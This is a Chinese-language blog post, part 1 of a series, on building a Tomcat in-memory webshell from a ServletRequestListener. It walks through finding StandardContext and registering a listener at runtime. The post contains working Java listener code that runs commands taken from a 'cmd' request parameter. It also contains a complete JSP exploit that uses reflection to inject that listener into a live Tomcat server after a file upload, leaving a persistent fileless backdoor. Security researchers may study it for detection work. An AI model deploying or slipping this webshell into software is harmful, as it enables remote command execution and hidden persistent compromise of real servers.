---
layout: post
date: 2025-5-15
title: "Tomcat内存马系列1-Listener-内存马"
author: "XinYiSleep"
category: Java
---
<h1 id="GT0vV">一.基础信息</h1>

```
在上一篇文章中我们已经简单的了解了一下Listener了，那么首先能考虑被作为内存马的是ServletRequestListener：对请求对象的初始化和销毁进行监听
说人话就是每次请求的时候就是初始化，请求结束销毁，这一技术主要在Servlet3.0之后，并且呢tomcat7.x及以上才可以用，因为tomcat7.x在支持Servlet3.0，
为了方便调试我们添加包(代码一)，原因很简单你不加根本进不去(图一)。
懂点的可以先看一下图二。
```

```java
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-catalina</artifactId>
    <version>8.5.100</version>
</dependency>
```

![](https://xinyisleep.github.io/img/2025/Webshell/Listener/1.png)

![](https://xinyisleep.github.io/img/2025/Webshell/Listener/0.png)

<h1 id="Djyi0">二.动态注册</h1>

```
我们得知请求任意url的时候会被执行到监听器，首先这个监听器在写入之后需要重启才能生效,那么在实战中
我们不可能去修改代码更不可能重启别人服务，那么就需要动态注册，大致就是分析一下正常的Listener是怎么的一个过程，废话不多说，
首先我们需要创建一个恶意的Listener(代码一),在其中打上断点(图一)，走进StandardContext类中fireRequestInitEvent方法(图二)，
接着一直往上跟看看从哪里获取到了ListenerWeblshell的实例，在第一行getApplicationEventListeners方法中获取到了，那么看看是什么(图三,图四)，
得知他是一个类中的属性的话，那么需要修改他先看看有那么有Setter,发现是有的(图五)，到这里其实就已经结束了，现在我们的目的就是需要通过这个Setter进行动态注册打成目的。
```

```java
package com.example.webshell1;
import javax.servlet.ServletRequest;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.lang.reflect.Field;

@WebListener
public class ListenerWeblshell implements ServletRequestListener {
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
        System.out.println("销毁");
    }
    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        HttpServletRequest servletRequest = (HttpServletRequest)sre.getServletRequest();
        String cmd = servletRequest.getParameter("cmd");
        if (cmd!=null){
            try {
                Runtime.getRuntime().exec(cmd);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
        
    }
}

```

![](https://xinyisleep.github.io/img/2025/Webshell/Listener/2.png)

![](https://xinyisleep.github.io/img/2025/Webshell/Listener/3.5png)

![](https://xinyisleep.github.io/img/2025/Webshell/Listener/3.png)

![](https://xinyisleep.github.io/img/2025/Webshell/Listener/4.png)

![](https://xinyisleep.github.io/img/2025/Webshell/Listener/5.png)

```
在上面我们得知存在setApplicationEventListeners和addApplicationEventListener都可以修改，
我们先用addApplicationEventListener，现在的问题是如何拿到StandardContext实例，
那我们往上推看看谁调用了StandardContext他是怎么拿到的(图一)，那我们就模拟他就行了问我具体干啥了一切不知道也不需要管他，
(代码一,图二)，那你就要问了，你这是个锤子内存马呀，图二中已经创建一个新的Litsener,你就算添加进去有什么用这不冗余了吗？
而且还需要改java代码你这不是天方夜谭吗？没错下面我们就要想到的攻击面了，如果说存在文件上传的情况下我们是否可以在JSP中进行操作呢？
答案是可以的因为JSP中九大核心内置对象中刚好有request(可以看上一篇文章简单了解一下)，
```

![](https://xinyisleep.github.io/img/2025/Webshell/Listener/6.png)

```java
package com.example.webshell1;

import org.apache.catalina.Context;
import org.apache.catalina.connector.Request;
import org.apache.catalina.core.StandardContext;

import javax.servlet.ServletRequest;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.lang.reflect.Field;

@WebListener
public class ListenerWeblshell implements ServletRequestListener {
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
        System.out.println("销毁");
    }
    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        //拿到StandardContext实例
        Request Reques = (Request)sre.getServletRequest();
        StandardContext context = (StandardContext)Reques.getContext();
        //修改添加我们的Listener
        TestListener testListener = new TestListener();
        context.addApplicationEventListener(testListener);
    }
}
```
![](https://xinyisleep.github.io/img/2025/Webshell/Listener/7.png)

<h1 id="cZYlj">三.完整Listener内存马</h1>

```
首先获取org.apache.catalina.connector.Request的实例，在JSP中request是org.apache.catalina.connector.RequestFacade他实现了HttpServletRequest(图一,图二)，
但是存在一个request属性刚好类型是Request(图三)，通过反射获取request，之后取出org.apache.coyote.Request，
强制转换成StandardContext对象，执行addApplicationListener，完整exp(代码一),访问这个JSP文件之后会添加一个新的Listener到ApplicationEventListener，
重新请求的时候getApplicationEventListeners就已经有我们的Listener了，到这里还是有点绕的可以手动测试看看，要是这都没理解那我也无能为力了，
这已经是手把手了，好了其实还是蛮简单的，下期见(冲冲冲)。

```

![](https://xinyisleep.github.io/img/2025/Webshell/Listener/8.png)

![](https://xinyisleep.github.io/img/2025/Webshell/Listener/8.5.png)

![](https://xinyisleep.github.io/img/2025/Webshell/Listener/9.png)

```java
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.io.IOException" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>


<%!
    public class TestListener implements ServletRequestListener {
        @Override
        public void requestDestroyed(ServletRequestEvent sre) {
        }
        @Override
        public void requestInitialized(ServletRequestEvent sre) {
            HttpServletRequest servletRequest = (HttpServletRequest)sre.getServletRequest();
            String cmd = servletRequest.getParameter("cmd");
            if (cmd!=null){
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
        }
    }
%>

<%
    //获取org.apache.coyote.Request实例
    //request实际上是org.apache.catalina.connector.RequestFacade他实现了HttpServletRequest
    Field request1 = request.getClass().getDeclaredField("request");
    request1.setAccessible(true);
    //上面获取了request属性取出org.apache.coyote.Request
    Request o = (Request)request1.get(request);
    //强制转换成StandardContext对象，执行addApplicationListener
    StandardContext context = (StandardContext)o.getContext();
    context.addApplicationEventListener(new TestListener());
%>

```
```
下面就是刚刚那个Setter,其实也很简单但是尽量不要用因为他会覆盖掉所有的Listener这就很恶心,其实就多了一行代码。
```
```
Object listeners[]={new TestListener()}; //这种写法导致了覆盖了所有的Listener,导致只能执行这一个监听器
context.addApplicationEventListener(listeners);
```

